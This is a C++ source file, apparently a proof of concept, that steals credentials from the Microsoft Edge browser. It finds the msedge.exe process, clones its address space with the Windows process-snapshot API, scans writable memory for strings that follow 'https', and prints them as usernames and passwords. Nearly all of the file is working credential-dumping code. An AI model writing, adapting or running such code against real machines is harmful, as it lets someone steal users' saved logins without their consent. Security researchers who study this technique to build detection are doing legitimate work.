#include <windows.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <regex>

#pragma comment(lib, "advapi32.lib")

// Helper for CMD colors
void SetColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}



// Helper to check if a string is actually readable text (or else it was showing a bunch of unreadable text - REGEX was complicated here as the file / memory is mostly binary and gibberish)
bool IsValid(const std::string& str) {
    if (str.length() < 3 || str.length() > 64) return false;
    
    if (str.find("://") != std::string::npos || str.find("\\/") != std::string::npos) return false;

    for (char c : str) {
        if ((unsigned char)c < 32 || (unsigned char)c > 126) return false;
    }
    
    const std::vector<std::string> noise = {
        "favicon", "lifecycle", "http", "bing", "msn", "microsoft", 
        "adobe", "protocol", "Signals", "scheme", "URIDetect", "Signin",
        "yandex", "clarity", "substrate", "office", "azu", "onenote",
        "template", "fallback", "network", "bitdefender", "enabled", "disabled", "testing", "_mode", "auto_"
    };

    for (const auto& word : noise) {
        if (str.find(word) != std::string::npos) return false;
    }

    if (str[0] == '"' || str[0] == '{' || str[0] == '[' || str[0] == '(' || str[0] == '%' || str[0] == '.') {
        return false;
    }
    
    return true;
}



// Scan memory of snapshot handle
void ScanMemoryRegions(HANDLE hProcess, HPSS hSnapshot) {
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Scanning regions for credentials..." << std::endl;

    HPSSWALK hWalker = NULL;
    PssWalkMarkerCreate(NULL, &hWalker);
    PSS_VA_SPACE_ENTRY vaEntry;
    
    std::set<std::string> seen;

    while (PssWalkSnapshot(hSnapshot, PSS_WALK_VA_SPACE, hWalker, &vaEntry, sizeof(vaEntry)) == ERROR_SUCCESS) {
        // Bitmask check to catch all writable/executable pages while skipping guards
        bool isWritable = (vaEntry.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY));
        bool isGuarded = (vaEntry.Protect & (PAGE_GUARD | PAGE_NOACCESS));

        if (vaEntry.State == MEM_COMMIT && isWritable && !isGuarded) {
            std::vector<char> buffer(vaEntry.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(hProcess, vaEntry.BaseAddress, buffer.data(), vaEntry.RegionSize, &bytesRead)) {
                std::string chunk;
                chunk.reserve(bytesRead);
                for (SIZE_T i = 0; i < bytesRead; ++i) {
                    chunk += (buffer[i] == '\0') ? ' ' : buffer[i];
                }

                size_t pos = 0;
                while ((pos = chunk.find("https", pos)) != std::string::npos) {
                    size_t userStart = chunk.find_first_not_of(" \t\r\n", pos + 5);
                    size_t userEnd = chunk.find_first_of(" \t\r\n", userStart);
                    
                    if (userStart != std::string::npos && userEnd != std::string::npos) {
                        size_t passStart = chunk.find_first_not_of(" \t\r\n", userEnd);
                        size_t passEnd = chunk.find_first_of(" \t\r\n", passStart);

                        if (passStart != std::string::npos && passEnd != std::string::npos) {
                            std::string user = chunk.substr(userStart, userEnd - userStart);
                            std::string pass = chunk.substr(passStart, passEnd - passStart);

                            if (IsValid(user) && IsValid(pass)) {
                                std::string entry = user + "|" + pass;
                                if (seen.find(entry) == seen.end()) {
                                    seen.insert(entry);
                                    std::cout << "------------------------------------------" << std::endl;
                                    std::cout << "Username/eMail: "; SetColor(12);
                                    std::cout << user << std::endl; SetColor(7);
                                    std::cout << "Password:       "; SetColor(12);
                                    std::cout << pass << std::endl; SetColor(7);
                                }
                            }
                        }
                    }
                    pos += 5;
                }
            }
        }
    }
    PssWalkMarkerFree(hWalker);
}



// Search for the process' PID by its name -- Currently, the process name is hardcoded here but I can always change it to user input (Out of Scope for this PoC)
DWORD GetPidByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(entry);
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (std::wstring(entry.szExeFile) == processName) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &entry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}



// Main FCT
int main() {
    std::wstring targetName = L"msedge.exe";
    
    
    // Process Scan
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Scanning processes for " << targetName << std::endl;
    DWORD targetPid = GetPidByName(targetName);
    if (targetPid == 0) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Could not find " << std::string(targetName.begin(), targetName.end()) << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Found " << targetName << L" at PID " << targetPid << L"\n" << std::endl;



    // Handle to Edge process with limited perms: PROCESS_QUERY_INFORMATION & PROCESS_VM_READ
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Creating handle to process " << targetPid << std::endl;
    
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProcess) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "OpenProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Handle to process acquired!\n" << std::endl;



    // Process Snapshotting logic
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Attempting Process Snapshot... " << std::endl;
    HPSS hSnapshot = NULL;
    
    
    // Added PSS_CAPTURE_VA_CLONE to ensure we are reading from a point-in-time kernel clone (Thanks to AI for this one)
    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
    DWORD result = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, 0, &hSnapshot);
    if (result != ERROR_SUCCESS) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Snapshot failed. Error Code: " << result << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Process successfully Snapshotted!\n" << std::endl;



    // Extract the handle to the frozen VA Clone from the snapshot
    HANDLE hFrozenClone = NULL;
    if (PssQuerySnapshot(hSnapshot, PSS_QUERY_VA_CLONE_INFORMATION, &hFrozenClone, sizeof(hFrozenClone)) == ERROR_SUCCESS && hFrozenClone) {
        ScanMemoryRegions(hFrozenClone, hSnapshot);
        CloseHandle(hFrozenClone);
    }


    // Cleanup
    PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
    CloseHandle(hProcess);
    SetColor(14); std::cout << "\n[*] "; SetColor(7);
    std::cout << "Task complete." << std::endl;
    return 0;
}
